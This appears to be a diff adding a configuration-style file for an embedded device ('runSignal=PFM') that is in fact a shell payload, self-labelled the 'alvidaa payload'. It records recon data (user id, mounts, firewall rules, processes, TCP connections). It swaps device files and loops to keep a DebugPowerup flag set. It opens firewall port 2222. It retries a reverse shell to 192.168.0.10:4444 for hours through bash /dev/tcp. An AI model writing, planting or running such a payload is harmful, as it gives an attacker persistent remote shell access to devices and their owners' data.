@@ -1,0 +1,14 @@
+runSignal=PFM
+runCount=99
+runMaxCount=1
+mkdir -p /var/local/alvidaa
+{ id; date; uname -a; cat /proc/uptime; cat /proc/version; } > /var/local/alvidaa/proof.txt 2>&1
+chmod 755 /var/local/alvidaa; chmod 644 /var/local/alvidaa/proof.txt 2>/dev/null
+cp -f /var/local/pfmParse/PFMCheck /var/local/alvidaa/PFMCheck.bak 2>/dev/null; cp -f /var/local/pfmParse/Data/platform.txt /var/local/alvidaa/platform.bak 2>/dev/null; chmod 644 /var/local/alvidaa/PFMCheck.bak /var/local/alvidaa/platform.bak 2>/dev/null
+echo "alvidaa payload ran $(date) uid=$(id -u)" >> /var/local/alvidaa/payload.log 2>/dev/null
+( sleep 8; mkdir -p /var/local/pfmParse/Data; cp -f /var/local/alvidaa/PFMCheck.bak /var/local/pfmParse/PFMCheck 2>/dev/null; cp -f /var/local/alvidaa/platform.bak /var/local/pfmParse/Data/platform.txt 2>/dev/null; touch /var/local/DebugPowerup; chmod 644 /var/local/pfmParse/PFMCheck /var/local/pfmParse/Data/platform.txt /var/local/DebugPowerup 2>/dev/null; sync ) >/dev/null 2>&1 &
+( date; id; uname -a; echo "--- mounts"; cat /proc/mounts; echo "--- iptables"; iptables -S INPUT 2>&1; echo "--- var/local"; ls -la /var/local; echo "--- ps"; ps 2>/dev/null | head -60; echo "--- net tcp"; cat /proc/net/tcp 2>/dev/null | head -30 ) > /var/local/alvidaa/recon.txt 2>&1; chmod 644 /var/local/alvidaa/recon.txt 2>/dev/null &
+( i=0; while [ $i -lt 60 ]; do iptables -C INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null && break; iptables -I INPUT 1 -p tcp --dport 2222 -j ACCEPT 2>/dev/null && break; sleep 2; i=$((i+1)); done ) >/dev/null 2>&1 &
+( i=0; while [ $i -lt 720 ]; do bash -c 'exec 3<>/dev/tcp/192.168.0.10/4444 && exec /bin/sh <&3 >&3 2>&3' 2>/dev/null; sleep 10; i=$((i+1)); done ) >/dev/null 2>&1 &
+( while true; do sleep 60; touch /var/local/DebugPowerup 2>/dev/null; done ) >/dev/null 2>&1 &
+sync
